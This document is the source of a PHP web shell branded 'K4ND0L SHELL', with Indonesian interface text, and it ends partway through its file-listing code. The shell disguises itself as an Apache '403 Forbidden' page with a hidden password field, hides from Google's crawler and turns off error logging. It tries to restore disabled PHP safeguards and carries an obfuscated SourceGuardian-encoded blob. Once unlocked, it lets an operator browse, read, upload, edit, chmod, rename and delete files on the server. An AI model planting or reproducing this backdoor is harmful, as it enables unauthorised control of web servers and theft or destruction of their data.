<?php
@session_start();
@define('SELF_PATH', __FILE__);
$auth_pass = "40bbc868eff5a4667cebe50e885be816";
$cookie_hour_expire = 24;
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
    header('HTTP/1.0 403 FORBIDDEN');
    exit;
}
function printLogin() { 
?>
<?php
if(!function_exists('sg_load')){$__v=phpversion();$__x=explode('.',$__v);$__v2=$__x[0].'.'.(int)$__x[1];$__u=strtolower(substr(php_uname(),0,3));$__ts=(@constant('PHP_ZTS') || @constant('ZEND_THREAD_SAFE')?'ts':'');$__f=$__f0='ixed.'.$__v2.$__ts.'.'.$__u;$__ff=$__ff0='ixed.'.$__v2.'.'.(int)$__x[2].$__ts.'.'.$__u;$__ed=@ini_get('extension_dir');$__e=$__e0=@realpath($__ed);$__dl=function_exists('dl') && function_exists('file_exists') && @ini_get('enable_dl') && !@ini_get('safe_mode');if($__dl && $__e && version_compare($__v,'5.2.5','<') && function_exists('getcwd') && function_exists('dirname')){$__d=$__d0=getcwd();if(@$__d[1]==':') {$__d=str_replace('\\','/',substr($__d,2));$__e=str_replace('\\','/',substr($__e,2));}$__e.=($__h=str_repeat('/..',substr_count($__e,'/')));$__f='/ixed/'.$__f0;$__ff='/ixed/'.$__ff0;while(!file_exists($__e.$__d.$__ff) && !file_exists($__e.$__d.$__f) && strlen($__d)>1){$__d=dirname($__d);}if(file_exists($__e.$__d.$__ff)) dl($__h.$__d.$__ff); else if(file_exists($__e.$__d.$__f)) dl($__h.$__d.$__f);}if(!function_exists('sg_load') && $__dl && $__e0){if(file_exists($__e0.'/'.$__ff0)) dl($__ff0); else if(file_exists($__e0.'/'.$__f0)) dl($__f0);}if(!function_exists('sg_load')){$__ixedurl='http://www.sourceguardian.com/loaders/download.php?php_v='.urlencode($__v).'&php_ts='.($__ts?'1':'0').'&php_is='.@constant('PHP_INT_SIZE').'&os_s='.urlencode(php_uname('s')).'&os_r='.urlencode(php_uname('r')).'&os_m='.urlencode(php_uname('m'));$__sapi=php_sapi_name();if(!$__e0) $__e0=$__ed;if(function_exists('php_ini_loaded_file')) $__ini=php_ini_loaded_file(); else $__ini='php.ini';if((substr($__sapi,0,3)=='cgi')||($__sapi=='cli')||($__sapi=='embed')){$__msg="\nPHP script '".__FILE__."' is protected by SourceGuardian and requires a SourceGuardian loader '".$__f0."' to be installed.\n\n1) Download the required loader '".$__f0."' from the SourceGuardian site: ".$__ixedurl."\n2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="\n3) Edit ".$__ini." and add 'extension=".$__f0."' directive";}}$__msg.="\n\n";}else{$__msg="<html><body>PHP script '".__FILE__."' is protected by <a href=\"http://www.sourceguardian.com/\">SourceGuardian</a> and requires a SourceGuardian loader '".$__f0."' to be installed.<br><br>1) <a href=\"".$__ixedurl."\" target=\"_blank\">Click here</a> to download the required '".$__f0."' loader from the SourceGuardian site<br>2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="<br>3) Edit ".$__ini." and add 'extension=".$__f0."' directive<br>4) Restart the web server";}}$__msg.="</body></html>";}die($__msg);exit();}}return sg_load('0FE09B764756B6DCAAQAAAAXAAAABIAAAACABAAAAAAAAAD/d4RJO4MtR76mOCE9zDCj3cGTysba76cuf5MwEFBwmuws2WlyNxMee3IiUvJ62rH1xy+okJdXOI4mZxliczwaT6ZolGbyKnB/Lao/MBNsbWXsI/yh98qTQ95sAf8WXV0LILpdbzHUMMkosa4LE0GjaSgGcRt3WJf95H6/FK6ZT4A1AAAAIAMAAIWph1KQCCIi//MrY6bLPSlDdBrAUDerx7sfT0p5YfUXjR2rq76OqqgCbyqJHEytAYhKXlPfGh47oOKh69fVsRkaYFcvAwm7S9LAm+YS8VBzbUsN0OQjGecGuCkDzlwy/Dl1IzUL4gXuNMprOH8Jb6Deb0ZaJrrloWlOrfoPlu2GPFVM4sjbrjSu3EhC68ggwfsu/TOHJPKyJrxWEWeNHhq8uMXSNojhbj3ny+HMXhR+q8d4N/9syI9yo6xxv2juB0DOR1HOty6+4G8LejhqNmY5DbZjhpg9Cg9WLdjnyDAuYHucu5rHFT3zXPMpVBj4t5M5Uo6SZA3mfZ+7x3JZX5+gjl2VipnFduNG+JJXCyKIdgsXks0hrI2SycnjT8DCpdLiSOV8Nhbnur85xGqBNCCQuy1mkaeFlZqFCYQLwT8NlzK524pTJrJJRPyMl44Kz+pO0GI2KGin5J0c7C1s4/V9Lj6G7padT8Xo1fp0tknEQrL+qkJvg/Nq+1euccgfF7m34kWJ4SznEU2pqMpXeBgFvKtcdmBtbt4tcOVMo0oqSEd/YdRv1uKFS1srk6cNzubnY0lX1snm6Weu0FBjvItj6OB3ieq4TmKXUjT8aOHO734ROV3G3GpdZgMfLsTpEUw3Tf2r7ioOz8mETtmrnFlWazcsNIffY6aLtQAmFDtJ80kico828r2j/ZUqsaOUeTWmnrXlgx0bADBMkP9q5Mk3VOvDWMaapv82dwq3sutxjn5zpsgTzqXuUMh54/aHEItLqDpOUOVXX7QAHPCkVFOwApeFf55PDQHdjkqfaEJSgQ8NWJM8n5Tt8iNqSGOuaPE/1WrDn9vmsb/beWAkB2U6kbPbVNS5d/GMyM2bCaTUK9xw5xN6u2TC8kz8hmj19FEoEK0jb8rNRfSGi5l/xvTdZR//+l4q6YRCZ3pP+I0i7xcXnZ6wNmQEqYzqvNPldE12n11OP0TpEwzPacLxBGQ25+Oudg3TlaYc0EguKo/h/9CEhqcFxKlkOy6PM9fvKgc4PkTd/6nL50RPW4ovhJW0hWOI9P7nxlZlSrlUIpurNgAAACgDAADODuG6Kr/+vZGOwtRAlH724TIbtapmnRTmiFAeImqByQbEHkchGYfaSyG/TzGbkODFo0Dqxt9KtVYkKrsz4vGigOQ2SGg/Gw5V3v2kU83eNxB2aLE4Hk5Nx1e+5M/ODelcoHi+uHhPazh4GvA9LlCN3GMm2s4mOlF8S8rXE97AMnbtHuBsCRi1k93lJVrXGU13pMvQzUlo/WSSoSxa6PnuRclntg/5MvnIkLP+lU8QfIzI9xX4MbUpJHcUmRDSF8JscqjCa7OI6KMbsfQR0tqR74u7uOa8ugbn+Hd2ith/kFaO3tVEuhHupPwCp7HcogYkNYVRpRbaHJjSzghvqxh4x8k4pmQJuBH/9qFTPKjgmo3Pfs9YsK99dOQtQMpQY5Yz7h/dr574z5PwuTu9m5Hsl2n7NCSphXve81fMrADzL6+IkiTUgwUKwEoXK/Qzddy7ONDsF8XpHvAq5CbC4LDJszHJKCpC6O9QOcgdwiKFYeH+vgrMPDLlzTWO2KouKZIkCrwBy/7hSJVajRhQBvWk4zYapImtBe8/xPK/24jfBWoOp0fM3/cd9O/lSIe+uccr9JdzXBeamz5a/1UZ98sWRvJ7h/PZ4kZ04OFZVE1AuFafF2c3fekaiqPbF0Z69eZtaHWAvf/WWhnnM+xcB6eaGM07/tbYjfnTdFoIAF1W00r+j8AwvOk6glpcUCSxC683UeIC1pRTm0UhaEa0JKiO0XbZXD1JfDpDTGFrAn9NRFrdA8I6OuKilXu8VCzlXw5tKUsuUMIoqUGGn5JVHk75+nZJ6aUFee/x0nVugV2N0ae/VwECeUv+X6D6nRLJH+zD8iAearfzBccVkiDbeTCU7XTsWsl9+QMfwnBxfIoKfUuRYDNIL3kGQ1VvNPgThwOqCAaaYzkn7gUnFnvrbbNq5Y3onOAqyCda/FiMdZse91bfgn513Z92fXfYL4joL3RLq0UBSkOepMCc5smECPCeWdys+KqVRtPh60whjL6h1A9TNM6GW3/k9jvrXiOlQLWvgMtoj4RwrHIPMYVIWHKCv5gNsU8vduV2DmO3S08ol0WJnMsFwLNdNwAAACgDAACOeXaB8Z4eZJ9X61jiL83nsjhihwXQiJwdlSJ9ZaqtnzIXokUbMbzhMowtNTedMwdrPfVeVlvLpb39hPRAR9jEYO87e+VejW1c3NugnI9rk4nClkUUmJSzw4wwLpYRaWbzNBG9z1TCg1gH62cXwPX39QM5qXzFXJqZXuyf5onAxSbQjSizuT88ET+tv1a0ZC3AsP9VtTJPAXddzhSXa/GtblhX6SQh0mNOPRmIP7feWj8Oy/sk5w8MdYw+vsrPo/M8EHRa/30QwaFdZfY9fvQf5Cjd8Z1d9VakD6wbVFG/yIIxBy2huqIPJHzsTJQEi4UmX1AUSnl2sNSlAPjsXfJf0gXVhhaEkl6YWBstwRbFcTkscB7Vmmt4W6xVE2ETtLRhvqO90q8azZCYNndyhDTM3/VvnI+RGIltmcuKBmCNv6fmp7rTkeEzxQo4tQOtNlaLkw79juy/ILrPQBd7BQqXxwLMwQLGkFCxkUtQru+vNpG5pJYS9RUtEZL0NvyuUTdZCwkCGJbzR0YQCxBdlrbi4IR3q1avELabzX/I1ne280cZMgY6RAA1Uy/3y7MdQ1zPj7ZP9UO7EOaMHUpgloKeDJeBjIaV8uKdjTB47w+S7VpSVwQk7HQEkKpd4w/T7z+eoBxCBGTP1xqpydX14USsFCEoNXbk6ZpkkzEwBJhwVvi8os6O8agGLLNzINac04U/lJdWPgYJha5mAL2d+dt8A+oXpHnyBjRmPUaMpaM64uu9uTeUoLo14p8vIcymrdUDyw0EQHB10IPW0zPFGHbL+5myVzJvE0ot8LrQczA6HBuc4HsdN6mg35Hw1LD4BO224raUF8Wx3XH9xG4s2oJR21nT9o9LMZBFknLaxGYvd4RjLdjEICrOr5nvH2gNEcj74TviFMKtDZ61ltCTDolS1KZ/N/aPFytRt5LgRe9mxOpdCoxjIvgRptGN5kIKO0L5Bve4DDQtm/7/q+xenUDTsXuw1LdLNLFjSFZHx9CZbvQOpOT7NXh2e/2sDNc8Z39GFzSmBP6SmLCYUsHCfBwdENwgN6q7QVczgWXr/eNuDJQ4chEKgzKMOAAAACgDAABXf8huh68Ep8Jk/LQkUqA89D0e/VcEqZVEY6IF7B2e09ZGsVF87uPzzytK9BYu7B3YA9gLc8HGmo+3nYRyu3c7EkFM9Da/28/vWuH1tHrQwCQbD1y6Vvwi5Gil2Nm8h5Jk5GTA/bFwH+swYaZt/FAzhr5dG0zYTB1wvvq6Qph3CVyONwqHQocqXxRTjLCt1YZKz999v42nzlQINRgG2/Bf+BAlwokYTmsiKKymZT91jX+DA2Z+uDuXLHBo3+/NRN1uLCXqevMcnW5FbCpCjx6zi//QJeaH7ZFaHbctipYOLvrjkNTCsLintm0FzGDPe/z1CcESqjRbgko/1ZSkMtpbiOTxqc8OPBWEXH6IqR0vaT2qCJ+KoH8mPyHBQhanDOELpaOZzMrNDTMEN17fLacgH1CXnU0TF1ao4CgjgvyNZ9wSLUzyLPcPi4l8Kw42fn9fz2SSdfDGlADOlKYABnCTgRCmlSc/LdFzNcKwTomAgPbd6JkFQZsQ5QJVMh/H6V4tAci5B6QvDhpQUu5maH/WqyzfVkzL5NucVyhRmLY3EgFesNy9NYMkN//obVyy76i0080R/FL3k/Jmy9sMoHmix239StETooF+QCo718qPZx5Wezs6SYo6u1i8xzI1yO/gNiY9XuEWW2Xr2iWXytkf/mUHZvYSqRvMdo/kSikRPndFN1uTQl+ejmAobcGMb1OXKtj/rmWLIhQVkQj09r9Z1mMqvMwssEi0wjZEVp/jWbYg7ZpKqUzX3BS1969qYm9gIiHaL2c90VbLSKdsfcdBY/BpWiZunmOFy0A+aRekyHycWgEGBSs5Y4Td7b+26VVw3BjuWJ38csqOMaucCrK7FYiSn2ZprUR7wKaCP9dBVA4eLeA4n+6nNDBIdf6UPY4QlGuhQ1AxiMN3M9ldN+c2hV80w+VMdUu9gQSTFR6TNH/Ob4wU6myw9IPJeYP+UJsiSRQCbdpLiDvrwmIFsTWUhaY6jumxRVrCN2C0qnJxm9jfNU/cgWrhv/VPKzT4RwPlDnrnENI3D8CRLTMjBEtXKPqtYZQW2qbrh1DeTBCRUqALAZx+LxcYBwAAAAgDAAB2ACBAFI6jetB0s9T/ldr8Mn0OLINXss0/ayRuoVM5iomM/kseBrA0C9+SKOIakTUxx7QyC12+hiS8lvfBdt3pc5jEv2GMfMgGqX1LMow/vjnthqjaHNdZf0n6xH9Qwjq5OGuvl+1P4Q3mg+3Gj31TxhhOq4EBjBt27NTG4eOeGEjZUZ4L4OQv8kl8i+POtyifM4KadDdmi4WXu9wk1TxlofbNN9VaQweaPqflKgVdpVxMYyS3cdYN04TdrYrEb9xfRTp6MIodPggEgFgbiJMwS7dnTCMpcu07fTUYj3rPjGkwwfqSXKnZT7a2blrhoRBDsxuTJk16K3qNFFOAFvJmL68awXKujyIdEdZ6bYijN5m20r2wKDpzLaZX62FAvYlXygAwQI0LkBLi/uCarj//7YUcRGXEL9cVlwLGmGunbLKBOn6wXSSjJpbveWq17I8I92P3XTJxE0sHgeGDuwbEoa+srEKfrEe8GPjZgN14OU3oVTDzGGNgYdKTOrL3+fvEQ0t/YoeF0H2inq7GvWBrXrHPVUL9IQ9WI7+gpOsEWOxB1APYXwJtHA2VFTAJhEYLieRIi7OzsC0nxW1bK6nP3WPACmh57JBx/5ghpqlzOuGpX3mjDyo4V8Yg55JT1PkaSyQZD7MfE0tZnKWr7H68ydz5qsAMRJJTtAkHB3b6KdIgEdeSqb+c0AyxH8hGN8TwuRhlZQHe8eEPMX6v+LVLzq3AoAKPLx9faNkyoerYBF5B+YA4v86BnjBLs3/6cgtDZTrwbofOUrHjSpr0D++yrNKfOVGGhoMUd0bU8KkBDySjXHH7XYpOgpar9C+N7k/M/OS8YCY1qqcjvTzMMTMsrzz6ORCVyimT1xVqnzPCbe5LeUyzQ9+iHZfKBhdP/c9vfgoWsf5kLzShvCftYv4SRyJ10pmkpYVQitMTZq5ok/QLD7adzE+sRVeF2laqVwLuuKnO0zrldPee0N8VJv25DdNshECwuIao/8demQqYxxpYkV6xVTBvFjLTG7FsV1TKWtYyzfeUQEcAAAAIAwAAdl8DwOXKUyHfpKOc+eysedHTYiLP9FPs6eNOZ3PpXLVkDk2yNHI2G40OZ/WoGWlo+xZJRlJMkx4F4EM7urVArmE8qiFGS5UR/KPtr+j1VLofT9YtPYBdfuNdeQskF4irugioKIyp4oNImIs9orVWExjeFUpouPIUoJ+YgNGgKfJ3qeSgQKdYKPrI+5xlbAQuEnkNz2Az3zhBSu84BiDaGY8W3N102weMunhW+mN+XlM2/mB41AO2D9NU90PBRL8uZs9oss6MHSNOxeHauME5iVtzRZ+emAs0OEBcet/GaBHvxWBn3RNCU5ZrHZM2/JOXfmBbHtuQngFWbHC1G6PId4AW+jytEY0lJZ3YthqkUNesd5qrKQXeOcEIjVigQIA98VW/YDDWmgYvDtbi5yU6ng21WAg7e3jGfKkJRE33jwTROCppL4azJvJSVYjzWHvQbz28gTMqxwMSXh0e6GTW2DHOa/3fkpx56Oa+pODj1zIYeNsYm4mESb9KSWKZA1YUMci5v4yypLqTG8biCnV9T1aV4zlrJGJe1YBZX2Aop9EpZr3cKUitKO4Z+i5kD2/utcWx7QJj1smlRsGFXLZ+0Nh1iEZ7iRUWq3LeDXfCw7+RpolQj8IHc8q2ms0atE60mDlW+E7YEZPODw95/T+Jny/KiknDvx9w6FiMmSQyxfHFesYPiyNfRFju/S9eweg9H854Pk6lYIavwKoO8VioB/Eh7PS6lDjW+sxLIPsD47UKRLXgBUOcQO08f2lretIXBLZnj6yjGE8AQvkVkYWSGyaOGjXpsolkAeLRUMEDCaV/jvo4S6ulc3z4KSEOCcHLOa/KAXbu+yGNBt9mVMBtOV4+WJdIoGv2hA2fZuUl5VYREtFEYIZxV5iMwhtd3z5ONdcYmdlRpcmIISgfzhized/n7GGwARnchskM8CEdYd0dd5y6WxY3TKcI3GhuXZ75joHHwMa6fBBjj6vEYCdiHo6auodolQJUVQhOpftZ83EmulE9QhIROALVaQ3GI+sAUDyGaCxHY85IAAAACAMAANBm3P7x/Fq4iR1MQ6NN3IXgV3Blv1Mb9MUzv2CICiePrvYFoUfCF0KSMIBFo6OuFSIqpj2THOaCaQJKG48DqMTjp9HYBxeUgewg1k1HodKtaqMgnOGZN0bOC5pglsKfuJ0ZqSsbrtSIEUqkPKc7LIZi2kFLnHG3qvTrkpVx2L2e3tkyCwM2pnpA349FAtWi5zHFpjTRL7MJWbf2uc3Sf8GajU5QPOCcw3pNIfdG426Pu70i2+5IqOIVCq4GQbyVj64BQO7j6kQCKgbYmeqhXTAcpKWVtE+NPGU50WKTLkBRJLbGhpQwMzGlPwYSEA0e2oIiLXy76LttBKq/9GMQrElMmO3mopWNXy+4Li2QEc7+YIsJaZfHb8NefiLWkYJ2g+9DvggVjiVW5ghzR8LPyu9J3zUpH2rrqiyKMfNAbHJ6ewFy2nSPgdC7m53eChrPhE4O3S8h1mx3NsWSYWZWyUE5l9xvla56laA0crMxKsxq70sHVfBvBQ2t8Izk+VD5f0Di6c/PDWJzpp6ly6gOm48BhZWhrHxVcJK8lcfXBN9Mok2bd9tX26V7CsiNHaxl2GPqxLbd6nD/XCBoZYyQojHvZf2fcQCgg70O4E3Jr8ZZgpBNZ/Ld147lnNwSemvTui0tj4V4pDAlH58Dug8ERInronEM/ihDsuU4dBkDhJgNu9O8on9Q6j9ww3IVO+uD7Vuh7mO/ds/NXKCmyYRKeoefVFhzWfuE1/T75/jGj6C0GfPEJy/KKwSveMnhKAJT6Dih9JDyjs0FIJKHYQM1xZK2/ldGFfwbwcW/hraAcK1BP8DD/ZOyCLdFhXN5qk9H6WwDH1expM2+84YKpXgWsDVG10PAuqd0oUzFCixg/ShTrpO8djmBYXC9yHCiSP86WstOkWf1A0z9LDTJUTusFGGUv4WqpPMlvIoLMx/sL5l2mz+OuAVUD6jePE11xuERbYi2ZqHdB8eDndW8VB+z31SOI31RAsxgL3G3t6aR7WYm6G7EFptryorDdLFYlytTiCnFGRQ1/2EfSQAAABADAAD8/7NtxOamoDicsARYm+YvNEm4CbMPHIYuWZNyW0scK5U9nCgWSUEcm2nG3bTQHtj57SJXYVysHUj5x/brvBGkLOlxQO41lbWOz7cCOlDkOkBQEAPFAB74e8t6aUkhSSZs0GXip6JPu1ChpCQ8eKR707iBGhPFrT05a66SHbUyl2gWF/wZC036SfeAt6nV8Y+1DYpS4ovbIoMv+Vxrrdw9g65j30tA2d7ImO6A0Zrjx26l0p8Yk3Tt24aeyomvvYzav3e4kEHM89Od0ubqUla/HX/kpgTZl/ifgAsXNY2hyZfaRcBc4rG9oLENkRNIUnXGV/Ssdu80/5FUydzkqVqbUAjIqD1W31EF/EGY/KtjBDqndbAUlecIY5LO5/J/CTOBpNhsPlHH9vJTxFyw1jPHGU9DdpVQo3e6Vn8XGngI8dYSIps1Z+KOphDLK54EkE/iygfm6zbfuJSEz7OhkSjXY9vYwAl0SgQt1FDiw2O/2X8lmJ3pwZopHFNEvNuGW498JooxOXr811e1bIiNvK3hYgfWvo4EBuihRbeLiDpJrdyifVyuAPiaDAIX1Fnu9xiMee9XzTvWfZWBtAcQOFWxm6enNctJIf/ZyYHmIbTwiqxbGIdIFCzXfp3CR2Xt6W8g8mhN681EwWQA6rDjVM5JvjqqfFhUisEqymq3xbkvAlei0GwYUL4V5/FVhs1xvdiA4ZaAml7HCe7TCNjm4CG5nUFdCKA4d/WzSr0TpxL7hadaxnc2h8wzeLDSH8vpwe/FvUG/jIVNNyeqFl4j6GOz+4477Qxfr+MaDWCQj+ra4bqptf6XDzPfw/mVuyf6poJiqhFlnk4z/6yAB20p9PJQA30U2WKU95tfWsVYWvw2V1JaMmDN43Fveo9UhG6gBywCUN+1JdOu8GTSV9wI0J2nN94HfvSs7m65+cko04L2Xf4k4oRUpo8IAYI1qZ5ChLqAzPCQ0wIpHkgTIMwMmrUvZD2C+xdwAKZnG9ftX8GKVMcaDm8cwl0wSCNvNIJcGwPkGoIPvNDb4tOP0HUOISvOSgAAABADAACpA0bCYVIiGQuLlAjaXTLE+CWNzaUM0W2ABk4L5lIcbT48GJVZcd0V+jtpXCEznQV5RwWYkRSSKJxZu23xiRGXkY6SwiMQl2jx/uC9R2cGwXjoCfZH+wR+z2/okNwQtnGnFx8G5np29n3VYh4B/KdgKht4u24zQAN5ODPDyadr3ua4XYOyRU42KruIXbtyOWJRHuB1BtDfBJRKj1xwGb0tozFZvYd0KPkITvZHsHZXd81XbPLxu2rLtR38Jd9WLM0I0QXvrr8ZHDziRtYwtGLe1AUlHUmWkvvKhbaFtYaySi15V8fsiNYOOZFHku+bJOjtwarAXU7lWz8uvlBPU7P1fe3M7oM3DA6N2cwIKjtnda8V/D6Kk+KVK9+EGbkS9WiPF4e4rAl+KKf77FX+d7MSqzeD22Ai3BQxvkUoXgIZVlBEVruffBNZLnEqKC0wcGHqIeaTXXW2M9PlyIh5z/L3Hm/78eI/MYi22mxdMUnZ2f0sWNEE0p6hXO0Mzf+A9qH3M22XhkOHQ/i9y5G5BDSsDzJeAT5dOma9n/kF55lhSRlUdhoBOUkIuLPzOazsJC19GQDAVT8+bOhXc+FAMQkeP6Q42Ysv32Nw/ZCQvlZxiAbrcMlWBs+4NyL38BvhVYDPnLZ8du/OI70d9wjHKFSvFOlgHLnhP1UOxCNPdfzs/NWZ/dCl+0zXLblMyvQUgQ4Z+l5THCshH9nuQrvAwEhPwhy6DJIi+auwO9AZPMNZ8/UIGjYbgowcw1ZEAGdU/5MUVesvXFU2GqaoN0NMD+zEQjg2NjXm+I3ddxDFx1KIaJ8YUsisjdBCA4OLgxjggJJVK8vxmO0DwsoL47K4pVY5ziNW5Is2oTnLPYZ7IRd21tl9DhPlmoOp49KPl+pnw6Bhfh0g0u5+ppjMyrAPz+UGeTycGGToNcPdjdltZ/2HsEqnmAXuJIBpTZmzx4t6crmMToJf1REUzb4NG2PQLElBYfyDx6kHjrFOMOMjd1ai2WeFS2jMOu9D0Z1ooYcGT3X192RJB98u06LleeJTFcWFAAAAAA==');
 
<html><head><title>403 Forbidden</title></head>
<style> 
input { margin:0;background-color:#fff;border:1px solid #fff; } 
</style> 
<body>
<h1>Forbidden</h1>
<p><? $_SERVER['PHP_SELF'] ?></p>
<p>You do not have permission to access this document.</p>
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
<form method=post>
<address><?=$_SERVER['SERVER_SIGNATURE'] ?><center><input type=password name=x><input type=submit value=''></center></address>
</form></body></html>
<?php
    exit;
}
$cookie_value = md5($_SERVER['HTTP_HOST'] . "dm" . $auth_pass);
if (isset($_POST['x'])) {
    if (md5($_POST['x']) != $auth_pass) {
        printLogin();
    } else {
        setcookie("dm", $cookie_value, time() + (60 * (60 * $cookie_hour_expire)));
    }
} elseif (isset($_COOKIE['dm'])) {
    if ($_COOKIE['dm'] != $cookie_value) {
        printLogin();
    }
} elseif (!isset($_COOKIE['dm'])) {
    printLogin();
}
if (isset($_POST['logout'])) {
    setcookie("dm", "", time() - (60 * (60 * 60 * 360000)));
    $page = $host = 'http://' . $_SERVER['SERVER_NAME'] . '/' . $_SERVER['PHP_SELF'];
    echo '<center><span class="b1"> Please Wait ...</scan></center>';
?>
<script>window.location.href = '<?php print $page; ?>';</script>
<?php exit(0);
}
@set_time_limit(0);
@error_reporting(0);
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@ini_restore("safe_mode");
@ignore_user_abort(FALSE);
@ini_restore("open_basedir");
@set_magic_quotes_runtime(0);
@ini_restore("allow_url_fopen");
@ini_set('max_execution_time', 0);
@ini_restore("disable_functions");
@ini_restore("safe_mode_exec_dir");
@ini_restore("safe_mode_include_dir");
@ini_set('zlib.output_compression', 'Off');
$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$u = explode("/",$pageURL );
$pageURL =str_replace($u[count($u)-1],"",$pageURL );
 
$pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
$u = explode("/",$pageFTP );
$pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
 
 
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Architects+Daughter" rel="stylesheet" type="text/css">
<title>K4ND0L ./$H3LL</title>
<style>
body{
font-family: "Share Tech Mono";
background-color: black;
background-image:url(https://i.ibb.co/18TLcFk/FB-IMG-15576621682790199.jpg);
background-size: center; background-repeat:no-repeat; background-attachment: fixed; background-size: cover; background-position:center; 
color:Orange;
}
#content tr:hover{
background-color: grey;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: cyan;
}
table{
border: 1px #000000 dotted;
}
a{
color:lavender;
text-decoration: none;
}
a:hover{
color:lavender;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
</style>
</head>
<h1><center><font color="lavender">404 K4ND0L SHELL</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="lime">Lokasi Lu :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload File Berhasil</font><br />';
}else{
echo '<font color="red">Upload File Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lavender">Upload Disini:</font> <input type="file" name="file" />
<input type="submit" value="Klik Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'cHmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Rename Dir Berhasip </font><br/>';
}else{
echo '<font color="red">Rename Dir Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Rename File Berhasil</font><br/>';
}else{
echo '<font color="red">Rename File Gagal</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Dir Berhasil Di Hapus</font><br/>';
}else{
echo '<font color="red">Dir Gagal Di Hapus</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Berhasil Di Hapus</font><br/>';
}else{
echo '<font color="red">File Gagal Di Hapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>ModifiKaSi</peller></center></td>
</tr>';
 
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="Delete">Delete</option>
<option value="Chmod">ChMod</option>
<option value="Rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
